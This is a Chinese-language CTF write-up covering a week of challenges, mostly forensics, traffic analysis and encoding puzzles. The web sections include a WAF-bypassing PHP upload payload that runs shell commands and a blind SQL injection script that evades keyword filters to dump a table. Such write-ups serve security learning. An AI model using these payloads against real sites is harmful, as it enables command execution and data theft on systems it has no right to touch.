---
# image bucket id
butterId: 4df72543-170c-4dff-a021-5bc0cff9f636
---

# Week1 Summary

## What have I done

- 红明谷杯 2021 WriteUp Partially

- BUUOJ 刷题 WriteUps

## [WriteUp] How did I accomplish these things

### write_shell

题目给出如下代码。

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}

function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output);
      }
  }else{
      $input = check($input);
  }
}

$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
    mkdir($dir);
}
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);
}
?>
```

使用 `?action=pwd` 得到当前沙盒路径 `sandbox/4e5b09b2149f7619cca155c8bd6d8ee5/`。使用 `<?=` 标签构造出 payload <code>?action=upload&data=\<?=&grave;ls%09/&grave;?></code> 之后再访问沙箱路径可得如下内容。

```plain text
!whatyouwantggggggg401.php bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

构造出 <code>?action=upload&data=\<?=&grave;nl%09/!whatyouwantggggggg401.*&grave;?></code> 后再访问沙箱路径查看页面源代码可以发现如下内容，从而可以得到 flag。

```php
1	<?php $flag = 'flag{85d95bb1-3831-4529-8bfa-cc7336c57b27}';?>
```

```flag
flag{85d95bb1-3831-4529-8bfa-cc7336c57b27}
```

### happysql

随手注册一个账号登录上去可以发现并没有业务界面，结合题目猜测是 SQL 注入，且注入点在登录或者注册的页面。因此构造出如下 payload 验证得到一个布尔逻辑。

```plain text
username=null"/**/||/**/1/**/In/**/(1)#
&password=122
```

于是尝试读取出数据库名，此时可以发现很多字符被 ban 了。这里记录一下部分遇到的字符。

```plain text
or,and,=,>,<,substr,if,[空格],+,-
```

此时可以采用 `In (1,2,3...)` 的方式来二分盲注，使用 `case when ... then ... else ... end` 的语法来做逻辑判断。需要注意的是 `in` 并不是匹配一个区间而是需要穷举，譬如 `select (2 in (1,3))` 返回的将会是 0，应为此时的 2 既不是 1 也不是 3。因为 `substr` 被禁用，因此采用 `left(reverse(left({sql},n)),1)` 的办法来读到每一位。此时构造出如下两个 payload 即可验证可行性。

```plain text
username=null"/**/||/**/(case/**/when(ascii(left(reverse(left((select/**/database()),1)),1)))/**/in/**/(99)then(cot(0))else(1)end)#
&password=122
username=null"/**/||/**/(case/**/when(ascii(left(reverse(left((select/**/database()),1)),1)))/**/in/**/(0)then(cot(0))else(1)end)#
&password=122
```

写个脚本用二分法查出表名。因为 `or` 被禁用导致没有 `information_schema` 可用，此时可以采用 `mysql.innodb_table_stats` 代替其查出表名。因为无法查出列名，因此采用无列名注入。写个脚本跑出 flag。

```python
import time
from urllib.parse import urlencode
import requests

url = ".../login.php"
session = requests.session()


def main():
    text = ""
    keywords = ""
    for i in range(200):
        low = 32
        high = 126
        while low <= high:
            mid = int((low + high) / 2)
            # sqlContent = "select/**/database()".replace(" ", "/**/")  #ctf
            # sqlContent = "select group_concat(table_name) from mysql.innodb_table_stats".replace(" ", "/**/")  #ctf,f1ag,gtid_slave_pos
            sqlContent = "select group_concat(b) from (select 1 as b union select * from f1ag)a".replace(" ", "/**/")  #1,flag{972f6491-7e54-47b1-ada0-639991ecd284}
            param = {
                "password": "null",
                "username": f"nullnull\"/**/||/**/(case/**/when(ascii(left(reverse(left(({sqlContent}),{i})),1)))/**/in/**/({str(list(range(low, mid + 1))).replace('[',' ').replace(']',' ').replace(' ','')})then(cot(0))else(1)end)#"
            }
            r = session.post(url=url, data=param)
            if b"Username" in r.content:
                high = mid - 1
            else:
                low = mid + 1
        print(i)
        mid_num = int((high + low + 1) / 2)
        text += chr(mid_num)
        print(text)


if __name__ == '__main__':
    main()
```

```flag
flag{972f6491-7e54-47b1-ada0-639991ecd284}
```

### 签到

有手就行的答题。

> 参考：https://www.cnitpm.com/pm/32463.html

![](https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617358076482.07a4ba821854dd46252e4b024f508e5dc420bddc.png@300w.png)

在数据库系统中，口令保护是信息系统的第一道屏障。

为了防止物理上取走数据库而采取的加强数据库安全的方法是数据库加密。

系统要达到什么样的完整性，取决于系统所处理信息地重要程度、价值和敏感性。

在数据库的安全评估过程中，可行性是指系统能够对付各种可能地攻击的能力。

数据库访问控制策略中，只需策略是只让用户得到有相应权限的信息，这些信息恰到可以让用户完成自己的工作，其他的权利一律不给。

数据库的安全策略是指如何组织、管理、保护和处理敏感信息的指导思想。它包括安全管理策略、访问控制策略和信息控制策略。

数据库的加密方法中，采用库外加密，则密钥管理较为简单，只需借用文件加密的密钥管理方法。

在下面的加密方法中，元素加密加解密的效率最低。

事故故障是指事务在运行至正常终止前被中止，这时恢复子系统应利用日志文件撤销此事物已对数据库进行的修改。

发生介质故障后，磁盘上的物理数据和日志文件被破坏，这是最严重的一种故障，恢复方法是重装数据库，然后重做已完成的事务。

```flag
flag{4df9488a-b979-4151-9f15-baa772faab3f}
```

### InputMonitor

> Akira在某次取证的过程中，在桌面找到了一个奇怪的文件，但是除此之外好像没有找到什么有价值的情报，很多的数据都被抹干净了，而且这个用户似乎根本就没装什么第三方的软件。Akira还粗心的只拷贝了C盘下的User目录，这下还有机会解开可疑文件吗？

查看附件中用户 link3 的桌面文件可以发现如下提示。

```plain text
没事，我都删掉了，之前的聊天记录都被我清干净了。除非他们在监控我输入
```

此时得知需要分析微软输入法的学习词库，并且可以得到 flag.7z。定向到 `%appdata%\Microsoft\InputMethod\Chs` 可得 ChsPinyinIH.dat 和 ChsPinyinUDL.dat。使用词库转换文件提取 UDL 文件中的内容可得提示。

> studyzy/imewlconverter: https://github.com/studyzy/imewlconverter

![](https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617474546488.deeae47218a5332e33a85e2b3204c5a786ddc960.png)

此时可知密码是六个字。再将 IH 文件中的内容使用 UTF-16LE 的格式解码。

![image-20210404023052648](https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617474654580.0da53e45c986f323c9c5e44f2884f07a0e1d47e5.png)

此时得到压缩包的密码 `有志者事竟成`。解压压缩包后得到 hidden.pdf 文件。将 PDF 文件使用 Acrobat DC 打开后将图片移开即可得 flag。

![](https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617474845995.829b70a6cfa12d47999bdddf033a5c72622023c2.png@300w)

```flag
flag{Y0u_F1nd_h1dd3n_m3g}
```

### 我的心是冰冰的

附件直接解压会提示文件头错误，因此直接采用 CyberChef 来提取文件。`Extract Files` 可以发现有如下图片，将图片和压缩文档下载下来。

![](https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617475381094.5f933f522524ad736a81bfca551f7d633ed70984.png)

对提取出的图片使用 Java 盲水印工具提取水印 `javaw -jar .\BlindWatermark-v0.0.3-windows-x86_64.jar decode -c '.\extracted_at_0x51.jpg' '.\extracted_at_0x51_d.jpg'` 可得如下图片。

![](https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617517178191.1bb1a0be2368cc55cdfd76143e4bd788551d026a.jpg@200w_200h_1c)

可知压缩包密码为 `gnibgnib`。解压压缩文件后得到流量包。使用 WireShark 很容易看出是 USB 流量。同时可以发现设备的制造厂商是 `Holtek Semiconductor, Inc.`。先使用 tshark 将设备的 Leftover Capture Data 给提取出来 `tshark.exe -r bingbing.pcapng -T fields -e usb.capdata > usbdata.txt`，可以得到如下内容。

```plain text
0000230000000000
0000230000000000
0000230000000000
0000060000000000
0000230000000000
00001e0000000000
0000230000000000
0000240000000000
0000240000000000
0000050000000000
0000200000000000
0000250000000000
0000230000000000
0000230000000000
0000200000000000
0000260000000000
0000230000000000
0000220000000000
0000230000000000
0000210000000000
0000200000000000
00001f0000000000
0000230000000000
0000230000000000
0000200000000000
0000260000000000
0000200000000000
0000200000000000
0000200000000000
0000200000000000
0000230000000000
0000220000000000
0000230000000000
0000230000000000
00001f0000000000
00002a0000000000
0000200000000000
00001e0000000000
0000200000000000
0000210000000000
0000230000000000
00001e0000000000
0000200000000000
0000250000000000
0000230000000000
0000210000000000
0000200000000000
0000270000000000
0000200000000000
0000220000000000
0000200000000000
00001f0000000000
0000200000000000
0000200000000000
0000230000000000
0000210000000000
0000200000000000
0000270000000000
0000200000000000
0000200000000000
0000200000000000
0000210000000000
0000200000000000
0000260000000000
0000230000000000
0000220000000000
0000200000000000
00001e0000000000
0000200000000000
00001f0000000000
0000200000000000
0000260000000000
0000200000000000
0000260000000000
0000230000000000
0000200000000000
0000240000000000
0000070000000000
```

USB Keyboard Data Hacker 跑一下可得如下内容。

```plain text
666c61677b3866396564326639333365662<DEL>31346138643035323364303334396531323939637d
```

将数据整理成如下内容。

```plain text
666c61677b38663965643266393333656631346138643035323364303334396531323939637d
```

再 `From Hex` 即可以得到 flag。

```
flag{8f9ed2f933ef14a8d0523d0349e1299c}
```

### 歪比歪比

附件给出的 data 很明显是流量包，使用 Wireshark 分析，跟踪 TCP 流。

![](https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617516627746.2bb321fbe2bf4f220f0e679d964eee3f8d96eb71.png)

很容易看出是哈夫曼编码，网上找一段代码解码。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-


# 统计字符出现频率，生成映射表
def count_frequency(text):
    chars = []
    ret = []

    for char in text:
        if char in chars:
            continue
        else:
            chars.append(char)
            ret.append((char, text.count(char)))

    return ret


# 节点类
class Node:
    def __init__(self, frequency):
        self.left = None
        self.right = None
        self.father = None
        self.frequency = frequency

    def is_left(self):
        return self.father.left == self


# 创建叶子节点
def create_nodes(frequency_list):
    return [Node(frequency) for frequency in frequency_list]


# 创建Huffman树
def create_huffman_tree(nodes):
    queue = nodes[:]

    while len(queue) > 1:
        queue.sort(key=lambda item: item.frequency)
        node_left = queue.pop(0)
        node_right = queue.pop(0)
        node_father = Node(node_left.frequency + node_right.frequency)
        node_father.left = node_left
        node_father.right = node_right
        node_left.father = node_father
        node_right.father = node_father
        queue.append(node_father)

    queue[0].father = None
    return queue[0]


# Huffman编码
def huffman_encoding(nodes, root):
    huffman_code = [''] * len(nodes)

    for i in range(len(nodes)):
        node = nodes[i]
        while node != root:
            if node.is_left():
                huffman_code[i] = '0' + huffman_code[i]
            else:
                huffman_code[i] = '1' + huffman_code[i]
            node = node.father

    return huffman_code


# 编码整个字符串
def encode_str(text, char_frequency, codes):
    ret = ''
    for char in text:
        i = 0
        for item in char_frequency:
            if char == item[0]:
                ret += codes[i]
            i += 1

    return ret


# 解码整个字符串
def decode_str(huffman_str, char_frequency, codes):
    ret = ''
    while huffman_str != '':
        i = 0
        for item in codes:
            if item in huffman_str and huffman_str.index(item) == 0:
                ret += char_frequency[i][0]
                huffman_str = huffman_str[len(item):]
            i += 1

    return ret


if __name__ == '__main__':
    # text = raw_input('The text to encode:')
    huf_text = "HUFFMAN_ENCODED_TEXT"
    char_frequency = [('j', 29), ('z', 31), ('7', 25), ('e', 31), ('l', 23), ('6', 37), ('4', 32), ('p', 38), ('h', 27),('g', 26), ('x', 28), ('i', 25), ('u', 27), ('n', 25), ('8', 36), ('0', 24), ('o', 23), ('c', 28),('y', 24), ('1', 29), ('b', 26), ('m', 27), ('2', 28), ('v', 25), ('d', 33), ('f', 28), ('9', 33),('t', 21), ('w', 22), ('a', 31), ('r', 24), ('s', 16), ('k', 32), ('5', 25), ('q', 23), ('3', 32),('{', 1), ('-', 4), ('}', 1)]
    nodes = create_nodes([item[1] for item in char_frequency])
    root = create_huffman_tree(nodes)
    codes = huffman_encoding(nodes, root)

    # huffman_str = encode_str(text, char_frequency, codes)
    origin_str = decode_str(huf_text, char_frequency, codes)

    # print 'Encode result:' + huffman_str
    print 'Decode result:' + origin_str
```

运行脚本得到如下结果。

```plain text
Decode result:jz7ezl64pjhgx6iun78roljc01bm72vjr7u44dfh9tewz8auzmzdzypet4d9xcehxspktdcgxgeeybmgva5pp9850b9mceifedlos6rehy8isvpzf6u545y50c4y9avuvqq3g1epi6igd6tciby7hep9o33cm3guo4qvcxqpcg6zdi5i1r6mmj6xcq5ummzm6jiniidbn51kppj15dp3zy4o8pww23kggukjrytosbkx8th00zba777e0kkz9e1te3u5i36fiym3pran1zgp2a192x63mnc35dhocqli21s2qby9htvdp82x9t6ai0n0wkvbl080bj3xzpj5m8a3jn67kh0le8v104lwa155n8n5o7y97ypdw6hv7d6rbkppxb3ktxnhttb29zsehww2u2x0fhb2k2p1uafhwrfgx7vha64xjr2ffewd30n9961ozt8dgdikly8cknf36kbh2chj28xrencflag{5rd477a2-6r36-dra9-9d63-49c2e9e5d1e5}f43x61l9v3de9z0hiwfz30l1keik5vx48m4yrausvae6fq1q7b9yb4s4tzqbbkyy2hizvqg26spral8rkz37cuylk1k0wfy8p4zppjujggcvpv9e0nhfopumxecd4zbo5sc76zpx8kvttaohud4ltdw16vmgfgucfw2nnafkuup4a6sgkxpk4nw0ax65j6w2498qoap2pqf4el1tu79k6jagxq4q7injr6pkz8yroz25ymdv7uq8h3k24mgf63gmld1i1jga7yupef74l95xr11l1yemjscrn313u89ilrpm8cfj8x826igbfmfnw98qdkm8i3z1vj8ajsebab9w9afhaccvd8qsv2u8zcohp6bxkjonpfoio896q01vje9o2jp00snunzj6zandlq7l8hldsct3ha4dawq9lq8t3u34fmkxrmwd8o4tmow3028o1rqcjzkg9mubjwr5byx7hn44o38vd50
```

此时其中包含有 flag。

```plain text
flag{5rd477a2-6r36-dra9-9d63-49c2e9e5d1e5}
```

但是需要注意的是，`('r', 24),('0', 24)` 两个字母的词频是一样的，因此实际上有两种解法，剩余的一种如下。

```plain text
flag{50d477a2-6036-d0a9-9d63-49c2e9e5d1e5}
```

### [CFI-CTF 2018]CFI-in-Kotlin

> skylot/jadx: https://github.com/skylot/jadx

jadx 简单反编译附件给出的 APK，在 `com/sagold/cfievent/LoginActivity.java` 下可以找到如下代码。

```java
private static final String[] DUMMY_CREDENTIALS = {"alerionMascot@CFIUL.com:HappyFirstYear"};
```

很容易发现这个 APP 实现了登录并且登录上去就会显示 flag。既然账号密码都已经拿到了，不妨安装一下并登录。然而登录上去了也没 flag。但是代码的实现逻辑确实是这样的。

```java
@Override // android.support.v7.app.AppCompatActivity, android.support.v4.app.SupportActivity, android.support.v4.app.FragmentActivity
    public void onCreate(@Nullable Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_information);
        if (getIntent().getBooleanExtra(IS_ADMIN, false)) {
            showLoginFlag();
        }
    }
```

因此我去查了 WriteUp，其中描述如下。

>With a internet connection, the flag will appear under the CFI logo.

Fine，那么这题的 flag 可能出了点问题。

```flag
CFI{DOUMMY_creeeeeddddd_issSoFriENDlieee_QUACKKKK}
```

### [watevrCTF 2019]Polly

附件给出的是一个方程，推测其 x 为不同取值时可以求得 flag。因此写出如下代码。

```python
def CalculateX(x):
    return # 这里写方程，太长了就不贴了

for i in range(100):
    print(chr(CalculateX(i)))
```

需要注意的是，因为方程数字太大了，需要使用 sagemath 才能算出准确结果。算出前 100 位可知其中含有 flag。

```flag
watevr{polly_polynomials_youtube.com/watch?v=THNWVVn9JO0}
```

### [BSidesSF2019]thekey

简单的键盘流量分析， Leftover Capture Data 提取出来再使用 USB Keyboard Data Hacker 跑一下可得如下内容。

```
[+] Found : viim<SPACE>flaag.ttxt<RET>iTthe<SPACE>flaag<SPACE>is<SPACE>ctf<ESC>vbUuA{[my_favoritte_editor_is_vim}<ESC>hhhhhhhhhhhhhhhhhhhau<ESC>vi{U<ESC>";wq<RET>
```

```flag
ctf{MY_FAVOURITE_EDITOR_IS_VIM}
```

### [watevrCTF 2019]Unspaellablle

附件给出了一份脚本，稍微找一下可以发现其原本的脚本。

> https://imsdb.com/transcripts/Stargate-SG1-Children-Of-The-Gods.html

将两份脚本使用 CyberChef 进行比较即可得到 flag。

![](https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617531493659.3f5fc9a3d635634d696e0d102426afa74dc34fed.png)

```flag
watevr{icantspeel_tiny.cc/2qtdez}
```

### [INSHack2017]remote-multimedia-controller

附件解压之后得到一个流量包，使用 Wireshark 跟踪到 TCP 流 2 可得一串 base64 字符串。

![](https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617531815294.0944ebc199ad8e033b56fa227d15d4710ac93c04.png)

```plain text
Vmxkd1NrNVhVbk5qUlZKU1ltdGFjRlJYZEhOaWJFNVhWR3RPV0dKVmJEWldiR1JyV1ZkS1ZXRXphRnBpVkVaVFYycEtVMU5IUmtobFJYQlRUVmhDTmxZeFdtdGhhelZ5WWtWYWFWSlViRmRVVlZaYVRURmFjbFpyT1ZaV2JXUTJWa1pvYTFkck1YVlVhbHBoVWxack1GUlZaRXRqVmxaMVZHMTRXRkpVUlRCWFdIQkdUbGRHY2s1VmFFOVdNWEJoV1Zkek1XSldaSFJPVm1SclZsZDRXbFJWVm5wUVVUMDk=
```

使用 CyberChef 套娃解码后可得如下内容。

```plain text
Good job ! You found the flag: INSA{TCP_s0ck3t_4n4lys1s_c4n_b3_fun!}
```

```flag
INSA{TCP_s0ck3t_4n4lys1s_c4n_b3_fun!}
```



### [GWCTF2019]math

附件给出的是一个 ELF 文件，使用 IDA 查看可以发现如下逻辑。

```c
puts("Pass 150 levels and i will give you the flag~");
puts("====================================================");
printf("Now level %d\n", (unsigned int)v9);
printf("Math problem: %d * %d - %d + %d = ??? ", v4, v5, v6, v7);
puts("Give me your answer:");
read(0, &buf, 0x80uLL);
if ( (unsigned int)strtol(&buf, 0LL, 0xA) != v5 * v4 - v6 + v7 )
{
  puts("Try again?");
  exit(0);
}
puts("Right! Continue~");
++v9;
sleep((unsigned __int64)"Right! Continue~");
}
while ( v9 <= 0x95 );
  if ( v9 != 0x96 )
  {
    puts("Wrong!");
    exit(0);
  }
puts("Congratulation!");
system("/bin/sh");
return 0;
```

因此需要连续计算正确 150 次计算题，而且需要与远程交互。因此用 pwntools 来写脚本实现。

```python
from pwn import *
process = remote('node3.buuoj.cn', 26631)
for i in range(150):
    process.recvuntil('Math problem: ')
    expression = process.recvuntil('=').decode().replace('=', '')
    expression = expression.replace(' ', '')
    expression = expression.translate(str.maketrans("+-*/", "    "))
    expression = expression.split(' ')
    print(str(expression))
    process.sendline(str(int(expression[0]) * int(expression[1]) - int(expression[2]) + int(expression[3])))
process.interactive()
```

```flag
flag{0e6a2af0-83e3-4fce-8535-a5bfd4c4cca9}
```

### [INSHack2018]Spreadshit

附件中给出了一个 ods 文件，将其使用 Excel 打开，查找并选中全部空格可得 flag。

![](https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617533032620.594e9b72117b159171e3f5e483ffbc3b612c5979.png)

```flag
INSA{3cf6463910edffb0}
```

## Summary

太摸了，下周必须要效率++。